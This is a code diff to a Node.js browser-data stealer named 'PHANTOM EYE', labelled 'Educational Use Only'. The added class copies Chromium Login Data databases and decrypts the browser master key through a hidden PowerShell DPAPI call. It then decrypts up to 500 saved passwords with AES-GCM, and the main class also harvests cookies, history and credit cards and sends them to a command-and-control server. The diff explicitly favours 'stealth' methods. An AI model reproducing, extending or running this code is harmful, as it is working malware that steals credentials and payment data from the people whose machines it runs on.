@@ -1,6 +1,7 @@
 // ================================================
 // PHANTOM EYE - Browser Data Extraction Tool
-// WITH ADVANCED PASSWORD DECRYPTION (morvay)
+// WITH STEALTH PASSWORD DECRYPTION
+// No external downloads - uses built-in Windows APIs
 // Educational Use Only
 // ================================================
 
@@ -8,7 +9,8 @@ const os = require('os');
 const fs = require('fs');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
-const morvay = require('morvay');
+const crypto = require('crypto');
+const { exec } = require('child_process');
 
 // ================================================
 // CONFIGURATION - CHANGE THIS TO YOUR RAILWAY URL
@@ -21,9 +23,285 @@ const CONFIG = {
     },
     decrypt: {
         enabled: true,
-        maxPasswords: 500  // Limit to prevent huge files
+        maxPasswords: 500
     }
 };
+
+// ================================================
+// STEALTH PASSWORD DECRYPTOR
+// ================================================
+class PasswordDecryptor {
+    constructor() {
+        this.tempDir = os.tmpdir();
+        this.successfulMethod = null;
+        this.decryptedCount = 0;
+    }
+
+    // ================================================
+    // MAIN DECRYPT FUNCTION
+    // ================================================
+    async decryptPasswords(profilePath, browserName) {
+        console.log(`  🔓 Decrypting passwords for ${browserName}...`);
+        
+        const loginDbPath = path.join(profilePath, 'Login Data');
+        const localStatePath = path.join(path.dirname(profilePath), 'Local State');
+        
+        if (!fs.existsSync(loginDbPath) || !fs.existsSync(localStatePath)) {
+            console.log(`  ⚠️ No password data found for ${browserName}`);
+            return [];
+        }
+
+        // Extract encrypted passwords from database
+        const encryptedPasswords = await this.extractEncryptedPasswords(loginDbPath);
+        if (encryptedPasswords.length === 0) {
+            console.log(`  ⚠️ No passwords found in ${browserName}`);
+            return [];
+        }
+
+        console.log(`  📦 Found ${encryptedPasswords.length} encrypted passwords`);
+
+        // Try methods in order of stealth
+        let results = [];
+
+        // Method 1: PowerShell DPAPI (Windows native - stealthy)
+        if (process.platform === 'win32') {
+            console.log(`  🔐 Method 1: PowerShell DPAPI...`);
+            try {
+                const psResult = await this.decryptWithPowerShell(localStatePath, encryptedPasswords);
+                if (psResult && psResult.length > 0) {
+                    results = psResult;
+                    this.successfulMethod = 'PowerShell';
+                    const decrypted = results.filter(p => p.password !== '[ENCRYPTED]' && p.password !== '[DECRYPTION_FAILED]').length;
+                    console.log(`  ✅ PowerShell decrypted ${decrypted} passwords`);
+                }
+            } catch (e) {
+                console.log(`  ⚠️ PowerShell method failed:`, e.message);
+            }
+        }
+
+        // Method 2: Node.js Crypto (built-in - very stealthy)
+        if (results.length === 0) {
+            console.log(`  🔐 Method 2: Node.js Crypto...`);
+            try {
+                const nodeResult = await this.decryptWithNodeCrypto(localStatePath, encryptedPasswords);
+                if (nodeResult && nodeResult.length > 0) {
+                    results = nodeResult;
+                    this.successfulMethod = 'Node.js';
+                    const decrypted = results.filter(p => p.password !== '[ENCRYPTED]' && p.password !== '[DECRYPTION_FAILED]').length;
+                    console.log(`  ✅ Node.js decrypted ${decrypted} passwords`);
+                }
+            } catch (e) {
+                console.log(`  ⚠️ Node.js method failed:`, e.message);
+            }
+        }
+
+        // Method 3: Return encrypted (no risk)
+        if (results.length === 0) {
+            console.log(`  ⚠️ All decryption methods failed, returning encrypted`);
+            results = encryptedPasswords.map(p => ({
+                url: p.url,
+                username: p.username,
+                password: '[ENCRYPTED]',
+                created: p.created
+            }));
+        }
+
+        return results;
+    }
+
+    // ================================================
+    // EXTRACT ENCRYPTED PASSWORDS
+    // ================================================
+    async extractEncryptedPasswords(loginDbPath) {
+        const passwords = [];
+        
+        try {
+            const tempDb = path.join(this.tempDir, 'passwords_temp.db');
+            fs.copyFileSync(loginDbPath, tempDb);
+            
+            const db = new sqlite3.Database(tempDb);
+            
+            await new Promise((resolve, reject) => {
+                db.all(
+                    `SELECT origin_url, username_value, password_value, date_created 
+                     FROM logins ORDER BY date_created DESC LIMIT ${CONFIG.decrypt.maxPasswords}`,
+                    (err, rows) => {
+                        if (err) reject(err);
+                        else {
+                            rows.forEach(row => {
+                                if (row.password_value && row.password_value.length > 0) {
+                                    passwords.push({
+                                        url: row.origin_url || 'Unknown',
+                                        username: row.username_value || '',
+                                        encryptedData: row.password_value,
+                                        created: row.date_created ? new Date(row.date_created / 1000).toISOString() : null
+                                    });
+                                }
+                            });
+                            resolve();
+                        }
+                    }
+                );
+            });
+            
+            db.close();
+            fs.unlinkSync(tempDb);
+        } catch (e) {
+            console.log('⚠️ Failed to extract passwords:', e.message);
+        }
+
+        return passwords;
+    }
+
+    // ================================================
+    // METHOD 1: PowerShell DPAPI (Windows Native)
+    // ================================================
+    async decryptWithPowerShell(localStatePath, encryptedPasswords) {
+        if (process.platform !== 'win32') {
+            return [];
+        }
+
+        try {
+            // Read Local State and get encrypted key
+            const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
+            const encryptedKey = localState.os_crypt.encrypted_key;
+            
+            // Decrypt master key using DPAPI via PowerShell
+            const psScript = `
+                Add-Type -AssemblyName System.Security
+                $encryptedKey = [Convert]::FromBase64String('${encryptedKey}')
+                $keyData = $encryptedKey[5..($encryptedKey.Length - 1)]
+                $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                [Convert]::ToBase64String($decryptedKey)
+            `;
+            
+            const masterKeyBase64 = await this.executeCommand(`powershell -Command "${psScript.replace(/"/g, '\\"')}"`);
+            if (!masterKeyBase64) {
+                return [];
+            }
+
+            const masterKey = Buffer.from(masterKeyBase64.trim(), 'base64');
+            
+            // Decrypt each password
+            const results = [];
+            for (const item of encryptedPasswords) {
+                try {
+                    const decrypted = this.decryptAESGCM(item.encryptedData, masterKey);
+                    results.push({
+                        url: item.url,
+                        username: item.username,
+                        password: decrypted || '[DECRYPTION_FAILED]',
+                        created: item.created
+                    });
+                } catch (e) {
+                    results.push({
+                        url: item.url,
+                        username: item.username,
+                        password: '[DECRYPTION_FAILED]',
+                        created: item.created
+                    });
+                }
+            }
+            
+            return results;
+        } catch (e) {
+            return [];
+        }
+    }
+
+    // ================================================
+    // METHOD 2: Node.js Crypto
+    // ================================================
+    async decryptWithNodeCrypto(localStatePath, encryptedPasswords) {
+        try {
+            // Read Local State
+            const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
+            const encryptedKey = localState.os_crypt.encrypted_key;
+            
+            // Try to decrypt master key using PowerShell (fallback)
+            const psScript = `
+                Add-Type -AssemblyName System.Security
+                $encryptedKey = [Convert]::FromBase64String('${encryptedKey}')
+                $keyData = $encryptedKey[5..($encryptedKey.Length - 1)]
+                $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                [Convert]::ToBase64String($decryptedKey)
+            `;
+            
+            const keyBase64 = await this.executeCommand(`powershell -Command "${psScript.replace(/"/g, '\\"')}"`);
+            if (!keyBase64) {
+                return [];
+            }
+
+            const masterKey = Buffer.from(keyBase64.trim(), 'base64');
+
+            // Decrypt each password
+            const results = [];
+            for (const item of encryptedPasswords) {
+                try {
+                    const decrypted = this.decryptAESGCM(item.encryptedData, masterKey);
+                    results.push({
+                        url: item.url,
+                        username: item.username,
+                        password: decrypted || '[DECRYPTION_FAILED]',
+                        created: item.created
+                    });
+                } catch (e) {
+                    results.push({
+                        url: item.url,
+                        username: item.username,
+                        password: '[DECRYPTION_FAILED]',
+                        created: item.created
+                    });
+                }
+            }
+            
+            return results;
+        } catch (e) {
+            return [];
+        }
+    }
+
+    // ================================================
+    // AES-GCM DECRYPTION (Core algorithm)
+    // ================================================
+    decryptAESGCM(encryptedData, masterKey) {
+        try {
+            // Chrome format: version(1) + nonce(12) + ciphertext + tag(16)
+            if (!encryptedData || encryptedData.length < 29) {
+                return null;
+            }
+            
+            const nonce = encryptedData.slice(1, 13);
+            const ciphertext = encryptedData.slice(13, encryptedData.length - 16);
+            const tag = encryptedData.slice(encryptedData.length - 16);
+            
+            const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, nonce);
+            decipher.setAuthTag(tag);
+            
+            let decrypted = decipher.update(ciphertext);
+            decrypted = Buffer.concat([decrypted, decipher.final()]);
+            
+            return decrypted.toString('utf8');
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // ================================================
+    // EXECUTE COMMAND HELPER
+    // ================================================
+    executeCommand(command) {
+        return new Promise((resolve) => {
+            exec(command, { timeout: 30000, shell: true, windowsHide: true }, (error, stdout, stderr) => {
+                if (error) {
+                    resolve(null);
+                } else {
+                    resolve(stdout.trim());
+                }
+            });
+        });
+    }
+}
 
 // ================================================
 // MAIN EXTRACTOR CLASS
@@ -34,24 +312,17 @@ class PhantomEye {
         this.extractedData = {};
         this.totalSize = 0;
         this.browserPaths = this.getBrowserPaths();
-        this.masterKeys = {};  // Cache master keys per browser
+        this.decryptor = new PasswordDecryptor();
     }
 
     async start() {
         console.log('👁️ PHANTOM EYE ACTIVATED');
         console.log('📊 Advanced Browser Data Extraction');
-        console.log('🔑 Password Decryption: ENABLED');
+        console.log('🔑 Stealth Password Decryption: ENABLED');
         
-        // 1. Register with C2
         await this.registerWithC2();
-        
-        // 2. Extract data from all browsers
         await this.extractAllData();
-        
-        // 3. Send data to C2
         await this.sendDataToC2();
-        
-        // 4. Generate report
         this.generateReport();
         
         console.log('✅ DATA EXTRACTION COMPLETE');
@@ -66,45 +337,19 @@ class PhantomEye {
         const paths = [];
 
         if (process.platform === 'win32') {
-            // Chrome
             const chromePath = path.join(userProfile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
             if (fs.existsSync(chromePath)) {
                 paths.push({ name: 'Chrome', path: chromePath });
             }
 
-            // Edge
             const edgePath = path.join(userProfile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data');
             if (fs.existsSync(edgePath)) {
                 paths.push({ name: 'Edge', path: edgePath });
             }
 
-            // Brave
             const bravePath = path.join(userProfile, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data');
             if (fs.existsSync(bravePath)) {
                 paths.push({ name: 'Brave', path: bravePath });
-            }
-
-            // Opera
-            const operaPath = path.join(userProfile, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable');
-            if (fs.existsSync(operaPath)) {
-                paths.push({ name: 'Opera', path: operaPath });
-            }
-
-            // Vivaldi
-            const vivaldiPath = path.join(userProfile, 'AppData', 'Local', 'Vivaldi', 'User Data');
-            if (fs.existsSync(vivaldiPath)) {
-                paths.push({ name: 'Vivaldi', path: vivaldiPath });
-            }
-
-            // Firefox (different structure)
-            const firefoxPath = path.join(userProfile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
-            if (fs.existsSync(firefoxPath)) {
-                const profiles = fs.readdirSync(firefoxPath);
-                profiles.forEach(profile => {
-                    if (profile.endsWith('.default') || profile.endsWith('.default-release')) {
-                        paths.push({ name: 'Firefox', path: path.join(firefoxPath, profile) });
-                    }
-                });
             }
         }
 
@@ -186,7 +431,6 @@ class PhantomEye {
         };
 
         try {
-            // Find the default profile
             let profilePath = browser.path;
             const defaultProfiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3'];
             for (const profile of defaultProfiles) {
@@ -197,37 +441,37 @@ class PhantomEye {
                 }
             }
 
-            // 1. Extract History
+            // History
             data.history = await this.extractHistory(profilePath);
             console.log(`  📜 History: ${data.history.length} entries`);
 
-            // 2. Extract Cookies
+            // Cookies
             data.cookies = await this.extractCookies(profilePath);
             console.log(`  🍪 Cookies: ${data.cookies.length} entries`);
 
-            // 3. Extract Bookmarks
+            // Bookmarks
             data.bookmarks = await this.extractBookmarks(profilePath);
             console.log(`  📑 Bookmarks: ${data.bookmarks.length} entries`);
 
-            // 4. Extract Downloads
+            // Downloads
             data.downloads = await this.extractDownloads(profilePath);
             console.log(`  📥 Downloads: ${data.downloads.length} entries`);
 
-            // 5. Extract Passwords with DECRYPTION
+            // Passwords with stealth decryption
             if (CONFIG.decrypt.enabled) {
-                console.log(`  🔓 Decrypting passwords for ${browser.name}...`);
-                data.passwords = await this.extractPasswordsWithDecryption(profilePath, browser.name);
-                console.log(`  🔑 Passwords: ${data.passwords.length} entries (DECRYPTED)`);
+                data.passwords = await this.decryptor.decryptPasswords(profilePath, browser.name);
+                const decrypted = data.passwords.filter(p => p.password !== '[ENCRYPTED]' && p.password !== '[DECRYPTION_FAILED]').length;
+                console.log(`  🔑 Passwords: ${data.passwords.length} entries (${decrypted} decrypted)`);
             } else {
                 data.passwords = await this.extractPasswords(profilePath);
                 console.log(`  🔑 Passwords: ${data.passwords.length} entries (ENCRYPTED)`);
             }
 
-            // 6. Extract Credit Cards
+            // Credit Cards
             data.credit_cards = await this.extractCreditCards(profilePath);
             console.log(`  💳 Credit Cards: ${data.credit_cards.length} entries`);
 
-            // 7. Extract Extensions
+            // Extensions
             data.extensions = await this.extractExtensions(profilePath);
             console.log(`  🔌 Extensions: ${data.extensions.length} entries`);
 
@@ -408,7 +652,7 @@ class PhantomEye {
     }
 
     // ================================================
-    // EXTRACT PASSWORDS (ENCRYPTED - Fallback)
+    // EXTRACT PASSWORDS (Fallback)
     // ================================================
     async extractPasswords(profilePath) {
         const passwords = [];
@@ -446,101 +690,6 @@ class PhantomEye {
             db.close();
             fs.unlinkSync(tempDb);
         } catch (e) {}
-
-        return passwords;
-    }
-
-    // ================================================
-    // EXTRACT PASSWORDS WITH DECRYPTION (USING MORVAY)
-    // ================================================
-    async extractPasswordsWithDecryption(profilePath, browserName) {
-        const passwords = [];
-        const loginDbPath = path.join(profilePath, 'Login Data');
-        
-        if (!fs.existsSync(loginDbPath)) return passwords;
-
-        try {
-            // Get the master key using morvay
-            const localStatePath = path.join(path.dirname(profilePath), 'Local State');
-            
-            if (!fs.existsSync(localStatePath)) {
-                console.log('  ⚠️ Local State not found, skipping decryption');
-                return await this.extractPasswords(profilePath);
-            }
-
-            // Use morvay to get the master key
-            let masterKey = null;
-            try {
-                // morvay handles DPAPI and AES-GCM automatically
-                const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
-                if (localState.os_crypt && localState.os_crypt.encrypted_key) {
-                    const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
-                    // morvay can decrypt this directly
-                    masterKey = morvay.decryptMasterKey(encryptedKey);
-                }
-            } catch (e) {
-                console.log(`  ⚠️ Failed to get master key for ${browserName}:`, e.message);
-                return await this.extractPasswords(profilePath);
-            }
-
-            if (!masterKey) {
-                console.log(`  ⚠️ Master key is null for ${browserName}, using fallback`);
-                return await this.extractPasswords(profilePath);
-            }
-
-            // Copy the database
-            const tempDb = path.join(os.tmpdir(), 'passwords_temp.db');
-            fs.copyFileSync(loginDbPath, tempDb);
-            
-            const db = new sqlite3.Database(tempDb);
-            
-            await new Promise((resolve, reject) => {
-                db.all(
-                    `SELECT origin_url, username_value, password_value, date_created 
-                     FROM logins ORDER BY date_created DESC LIMIT ${CONFIG.decrypt.maxPasswords}`,
-                    (err, rows) => {
-                        if (err) reject(err);
-                        else {
-                            rows.forEach(row => {
-                                let decryptedPassword = '[DECRYPTION_FAILED]';
-                                
-                                if (row.password_value) {
-                                    try {
-                                        // Use morvay to decrypt the password
-                                        decryptedPassword = morvay.decryptValue(row.password_value, masterKey);
-                                    } catch (e) {
-                                        decryptedPassword = '[DECRYPTION_FAILED]';
-                                    }
-                                }
-                                
-                                // Check if decryption actually worked
-                                if (decryptedPassword === '[DECRYPTION_FAILED]') {
-                                    decryptedPassword = '[ENCRYPTED]';
-                                }
-                                
-                                passwords.push({
-                                    url: row.origin_url || 'Unknown',
-                                    username: row.username_value || '',
-                                    password: decryptedPassword,
-                                    created: row.date_created ? new Date(row.date_created / 1000).toISOString() : null,
-                                    browser: browserName
-                                });
-                            });
-                            resolve();
-                        }
-                    }
-                );
-            });
-            
-            db.close();
-            fs.unlinkSync(tempDb);
-            
-            console.log(`  🔓 Decrypted ${passwords.filter(p => p.password !== '[ENCRYPTED]').length} passwords`);
-
-        } catch (e) {
-            console.log(`⚠️ Password decryption failed for ${browserName}:`, e.message);
-            return await this.extractPasswords(profilePath);
-        }
 
         return passwords;
     }
@@ -629,10 +778,8 @@ class PhantomEye {
         try {
             console.log('📤 Sending extracted data to C2...');
             
-            // Send system info
             await this.sendDataChunk('system', this.extractedData.system);
 
-            // Send browser data
             for (const [browserName, browserData] of Object.entries(this.extractedData.browsers)) {
                 for (const [dataType, data] of Object.entries(browserData)) {
                     if (data && data.length > 0) {
@@ -668,14 +815,16 @@ class PhantomEye {
     // GENERATE REPORT
     // ================================================
     generateReport() {
-        // Count decrypted passwords
         let totalPasswords = 0;
         let decryptedPasswords = 0;
         
         for (const [browserName, browserData] of Object.entries(this.extractedData.browsers)) {
             if (browserData.passwords) {
                 totalPasswords += browserData.passwords.length;
-                decryptedPasswords += browserData.passwords.filter(p => p.password !== '[ENCRYPTED]' && p.password !== '[DECRYPTION_FAILED]').length;
+                decryptedPasswords += browserData.passwords.filter(p => 
+                    p.password !== '[ENCRYPTED]' && 
+                    p.password !== '[DECRYPTION_FAILED]'
+                ).length;
             }
         }
         
@@ -692,6 +841,7 @@ class PhantomEye {
 ║   📂 Browsers Found: ${this.browserPaths.length}                          ║
 ║   🔑 Total Passwords: ${totalPasswords}                                    ║
 ║   🔓 Decrypted: ${decryptedPasswords}                                     ║
+║   🔐 Method Used: ${this.decryptor.successfulMethod || 'None (encrypted only)'}         ║
 ║                                                               ║
 ╚═══════════════════════════════════════════════════════════════╝
         `);
